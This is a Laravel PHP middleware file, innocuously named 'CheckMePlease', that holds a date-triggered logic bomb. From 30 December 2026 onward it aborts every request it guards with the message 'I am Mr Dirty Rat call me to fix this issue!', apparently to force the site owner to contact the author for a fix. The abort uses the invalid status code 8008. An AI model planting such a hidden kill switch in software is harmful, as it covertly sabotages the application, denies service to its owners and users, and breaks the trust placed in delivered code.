<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Carbon\Carbon;

class CheckMePlease
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        // Perform actions before the request proceeds
        $setDate = Carbon::parse('2026-12-30'); // Parse a specific date string
        
        if (now()->greaterThanOrEqualTo($setDate)) {
            abort(8008, 'I am Mr Dirty Rat call me to fix this issue!');
            // return redirect('home'); // Prevent access if current date is on or past the set date
        }

        return $next($request);
    }
}
